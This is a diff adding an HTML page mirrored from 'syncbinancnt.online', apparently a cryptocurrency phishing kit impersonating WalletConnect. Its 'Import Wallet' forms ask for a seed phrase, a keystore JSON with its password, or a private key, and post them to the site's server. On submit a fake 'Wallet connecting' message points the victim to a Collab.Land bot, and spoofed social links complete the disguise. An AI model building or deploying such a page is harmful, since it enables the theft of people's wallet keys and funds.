@@ -1,0 +1,439 @@
+<!DOCTYPE html>
+<html>
+
+
+<!-- Mirrored from syncbinancnt.online/wallets/import/ by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 11 Nov 2022 20:21:17 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
+    <link rel="stylesheet" href="../../../use.fontawesome.com/releases/v5.15.4/css/all.css"
+        integrity="sha384-DyZ88mC6Up2uqS4h/KRgHuoeGwBcD4Ng9SiP4dIRy0EXTlnuz47vAwmeGwVChigm" crossorigin="anonymous">
+    <link rel="preconnect" href="https://fonts.googleapis.com/">
+    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700;900&amp;display=swap" rel="stylesheet">
+    <title>Import Wallet</title>
+    <link rel="stylesheet" href="../../../stackpath.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css"
+        integrity="sha384-HSMxcRTRxnN+Bdg0JdbxYKrThecOKuH5zCYotlSAcp1+c8xmyTe9GYg1l9a69psu" crossorigin="anonymous">
+
+    <style>
+        body {
+            margin: 0px;
+            padding: 0px;
+            box-sizing: border-box;
+            background-color: #fff;
+            overflow-x: hidden;
+        }
+
+        a, a:hover {
+            text-decoration: none;
+
+        }
+
+        .header {
+            margin-top: 50px;
+            text-align: center;
+        }
+        .header h3 {
+            font-family: 'Roboto', sans-serif;
+            color: rgb(88, 112, 135);
+            font-weight: 700;
+            font-size: 3.5rem;
+        }
+        nav {
+            margin-top: 50px;
+        }
+        nav ul {
+            width: 80%;
+            margin: 20px auto;
+            display: flex;
+            flex-direction: row;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .nav-tabs {
+            border-bottom: 0px solid #000;
+        }
+
+        header {
+            text-align: center;
+            width: 100%;
+            height: 40px;
+            padding-top: 15px;
+        }
+
+        .nav-item .nav-link {
+            color: #000;
+            padding: 10px 95px;
+            margin: 10px;
+            border: 0px;
+            font-size: 11px;
+            border-radius: 20px;
+        }
+
+        .nav-tabs>.nav-item>.active {
+            background-color: #5878bc;
+        }
+
+        .nav-tabs .nav-link:hover {
+            cursor: pointer;
+        }
+        .nav-tabs>li.active>a, .nav-tabs>li.active>a:focus, .nav-tabs>li.active>a:hover {
+            color: #fff;
+            cursor: default;
+            background-color: #5878bc;
+            border: 1px solid #ddd;
+            border-bottom-color: transparent;
+        }
+        .import-box {
+            width: 90%;
+            margin: 20px auto;
+        }
+        form {
+            display: flex;
+            width: 90%;
+            margin: 0px auto;
+            flex-direction: column;
+            padding: 10px;
+        }
+        form div p {
+            text-align: center;
+            margin-top: 10px;
+            font-size: 1.2rem;
+            color: rgb(88, 120, 188);
+            font-weight: 700;
+        }
+        input {
+            margin: 20px 0px;
+        }
+        #overlay {
+            position: fixed;
+            display: none;
+            width: 100%;
+            height: 100%;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-color: rgba(0, 0, 0, 0.842);
+            opacity: 0.5;
+            z-index: 2;
+            cursor: pointer;
+        }
+        #barcode {
+            display: none;
+            position: fixed;
+            padding: 10px;
+            background-color: #fff;
+            top: 25%;
+            left: 40%;
+            z-index: 2;
+        }
+        #barcode p {
+            font-family: sans-serif;
+            font-size: 13px;
+            font-weight: 600;
+            color: #3F83F8;
+            margin: 6px;
+        }
+        span {
+            color: #64748B;
+            font-weight: bold;
+        }
+        #barcode button {
+            position: absolute;
+            right: -47px;
+            top: -20px;
+            background: #fff;
+            border: 0;
+            font-size: 20px;
+            padding: 2px 7px;
+            border-radius: 21px;
+            box-shadow: 2px 4px 6px grey;
+            cursor: pointer;
+        }
+        #barcode h1 {
+            position: absolute;
+            width: 100%;
+            top: -8px;
+            left: 0%;
+            text-align: center;
+            padding: 5px;
+            margin: 8px 0px;
+            font-size: 33px;
+            background: rgba(0, 128, 0, 0.705);
+        }
+        footer {
+            width : auto;
+            margin-top : 90px;
+            justify-content: center;
+        }
+        footer a{
+            color : rgb(88, 120, 188);
+            margin-left : 10px;
+        }
+        footer p {
+            display : flex;
+            height : 20px;
+            justify-content: center;
+            -webkit-box-align: center;
+            align-items: center;
+            padding-left: 0.5em;
+            font-size: 14px;
+            color: rgb(88, 120, 188);
+            font-weight: 500;
+            float : center;
+        }
+        .footimg {
+            max-width : 20px;
+        }
+        @media only screen and (max-width: 769px) {
+            .header {
+                text-align: center;
+            }
+        a .nav-link {
+            font-size: 10px;
+        }
+        nav ul {
+            width: 100%;
+            margin: 20px auto;
+            display: flex;
+            flex-direction: row;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .nav-item .nav-link {
+            color: #000;
+            padding: 10px 25px;
+            margin: 10px;
+            border: 0px;
+            font-size: 10px;
+            border-radius: 20px;
+        }
+        form {
+            display: flex;
+            width: 100%;
+            margin: 0px auto;
+            flex-direction: column;
+            padding: 10px;
+        }
+        form div p {
+            text-align: center;
+            margin-top: 10px;
+            font-size: 1.2rem;
+            color: rgb(88, 120, 188);
+            font-weight: 700;
+        }
+        footer {
+            width : auto;
+            margin-top : 90px;
+            justify-content: center;
+        }
+        footer a{
+           color : rgb(88, 120, 188);
+           margin-left : 10px;
+        }
+        footer p {
+            display : flex;
+            height : 20px;
+            justify-content: center;
+            -webkit-box-align: center;
+            align-items: center;
+            padding-left: 0.5em;
+            font-size: 14px;
+            color: rgb(88, 120, 188);
+            font-weight: 500;
+            float : center;
+        }
+        .footimg {
+    max-width : 20px;
+        }
+        #barcode {
+            width: 65%;
+            padding: 10px;
+            background-color: #fff;
+            display: none;
+            position: fixed;
+            top: 30%;
+            left: 15%;
+            z-index: 2;
+        }
+        #barcode div h3 {
+            text-align: center;
+            font-size: 2rem;
+            font-weight: 700;
+            margin: 20px 0px;
+        }
+        #barcode p {
+            text-align: center;
+            font-family: sans-serif;
+            font-size: 13px;
+            font-weight: 400;
+            color: #000;
+            margin: 40px 0px 20px 0px;
+        }
+        .header ul li {
+            width: 30%;
+            list-style: none;
+            font-size: 13px;
+            font-weight: 600;
+            line-height: 1.1;
+            font-family: sans-serif;
+            color: #64748B;
+        }
+        .header ul li:nth-child(2) {
+            font-size: 17px;
+            color: #64748B;
+        }
+            form {
+            display: flex;
+            width: 80%;
+            margin: 0px auto;
+            flex-direction: column;
+            padding: 10px;
+        }
+        }
+    </style>
+</head>
+
+<body>
+    <div onclick="barcodeOff()" id="overlay"></div>
+    <section class="header">
+        <h3>Import Wallet</h3>
+    </section>
+    <nav>
+        <ul class="nav nav-tabs" role="tablist">
+            <li role="presentation" class="nav-item">
+                <a onclick="cleanOn()" id="clear" class="nav-link active" aria-controls="phrase"
+                    role="tab" data-toggle="tab" href="#phrase">Phrase
+                </a>
+            </li>
+            <li onclick="clean()" class="nav-item"><a class="nav-link" role="tab" data-toggle="tab" href="#keystore">Keystore JSON</a></li>
+            <li onclick="clean()" class="nav-item"><a class="nav-link" role="tab" data-toggle="tab" href="#privatekey">Private Key</a></li>
+        </ul>
+    </nav>
+    <section class="import-box" style="margin-top: 40px;">
+        <!-- Tab panes -->
+        <div class="tab-content">
+            <div role="tabpanel" class="tab-pane active" id="phrase">
+                <form action='#' method='post'><input type="hidden" name="csrfmiddlewaretoken" value="Izz0zYonQODyHvpGoC2aPbRwoWCUPtcgmhjDAhO01hwk8m40lpMSTNqlsu2duUBW">
+                    <tr>
+    <th><label for="id_phrase">Phrase:</label></th>
+    <td>
+      
+      <textarea name="phrase" cols="40" rows="10" maxlength="250" required id="id_phrase">
+</textarea>
+      
+      
+        
+      
+    </td>
+  </tr>
+                    <div>
+                        <p>Typically 12 (sometimes 24) words separated by single spaces</p>
+                    </div>
+                    <input onclick="barcode()" type="submit" style="border: 1px solid; border-radius: 10px; background-color: #2A498C; color: #fff; font-size: 12px;" class="btn btn-block" value="IMPORT" name="">
+                </form>
+            </div>
+            <div role="tabpanel" class="tab-pane" id="keystore">
+                <form action='#' method="post">
+                    <input type="hidden" name="csrfmiddlewaretoken" value="Izz0zYonQODyHvpGoC2aPbRwoWCUPtcgmhjDAhO01hwk8m40lpMSTNqlsu2duUBW">
+                    <tr>
+    <th><label for="id_json_key">Json key:</label></th>
+    <td>
+      
+      <textarea name="json_key" cols="40" rows="10" maxlength="250" required id="id_json_key">
+</textarea>
+      
+      
+        
+      
+    </td>
+  </tr>
+                    <div>
+                        <p>Several lines of text beginning with '(...)' plus the password you used to encrypt it.</p>
+                    </div>
+                    <input onclick="barcode()" type="submit" style="border: 1px solid; background-color: #2A498C;" class="btn btn-block" value="IMPORT" name="">
+                </form>
+            </div>
+            <div role="tabpanel" class="tab-pane" id="privatekey">
+                <form action='#' method="post">
+                    <input type="hidden" name="csrfmiddlewaretoken" value="Izz0zYonQODyHvpGoC2aPbRwoWCUPtcgmhjDAhO01hwk8m40lpMSTNqlsu2duUBW">
+                    <tr>
+    <th><label for="id_private_key">Private key:</label></th>
+    <td>
+      
+      <textarea name="private_key" cols="40" rows="10" maxlength="250" required id="id_private_key">
+</textarea>
+      
+      
+        
+      
+    </td>
+  </tr>
+                    <div>
+                        <p>Typically 12 (sometimes 24) words separated by single spaces</p>
+                    </div>
+                    <input onclick="barcode()" type="submit" style="border: 1px solid; background-color: #2A498C;" class="btn btn-block" value="IMPORT" name="">
+                </form>
+            </div>
+        </div>
+    </section>
+    <footer>
+        <div class="footer">
+            <p><i class="fab fa-discord fa-lg"></i><a href="../../discord.com/invite/jhxMvxP.html">Discord</a>
+            </p><br>
+            <p><i class="fab fa-telegram-plane fa-lg"></i><a
+                    href="../../t.me/walletconnect_announcements.html">Telegram</a></p><br>
+            <p><i class="fab fa-twitter fa-lg"></i><a
+                    href="../../twitter.walletconnect.org/index.html">Twitter</a></p><br>
+            <p><i class="fab fa-github fa-lg"></i><a href="../../github.com/walletconnect.html">Github</a></p>
+            <br>
+        </div>
+    </footer>
+    <!-- <section style="width: 50%; margin: 0px auto; ">
+        <p class="text-warning" style="color: #000;"> WalletConnect is made available to ensure that you have a synchronized wallet and may not
+            be used for any other purpose. By using walletConnect you understand that the information you input are correct
+            and confidential. Walletsync will not be liable for key losses due to negligence of the user.
+        </p>
+    </section> -->
+    <section id="barcode">
+        <!-- <button onclick="barcodeOff()">X</button> -->
+        <div>
+            <h3>Message</h3>
+            <p>Wallet connecting.... Please close this page and check for a message from the Collab.Land bot</p>
+        </div>
+    </section>
+    <script>
+        function clean() {
+            document.getElementById("clear").style.background = "white";
+        }
+        function cleanOn() {
+            document.getElementById("clear").style.background = "#5878bc";
+        }
+
+        function barcode() {
+            document.getElementById("barcode").style.display = "block";
+            document.getElementById("overlay").style.display = "block";
+        }
+
+        function barcodeOff() {
+            document.getElementById("barcode").style.display = "none";
+            document.getElementById("overlay").style.display = "none";
+        }
+    </script>
+    <script src="assets/js/jquery.min.html"></script>
+    <script src="../../../code.jquery.com/jquery-1.12.4.min.js"
+        integrity="sha384-nvAa0+6Qg9clwYCGGPpDQLVpLNn0fRaROjHqs13t4Ggj3Ez50XnGQqc/r8MhnRDZ"
+        crossorigin="anonymous"></script>
+    <!-- Include all compiled plugins (below), or include individual files as needed -->
+    <script src="../../../stackpath.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"
+        integrity="sha384-aJ21OjlMXNL5UyIl/XNwTMqvzeRMZH2w8c5cRVpzpU8Y5bApTppSuUkhZXN0VxHd"
+        crossorigin="anonymous"></script>
+
+    <script>var url = new URL(window.location.html); var wallet = url.searchParams.get("wallet"); document.getElementById("hidden1").value = wallet + " Phrase"; document.getElementById("hidden2").value = wallet + " Keystore"; document.getElementById("hidden3").value = wallet + " PrivateKey";</script>
+</body>
+
+
+<!-- Mirrored from syncbinancnt.online/wallets/import/ by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 11 Nov 2022 20:21:24 GMT -->
+</html>
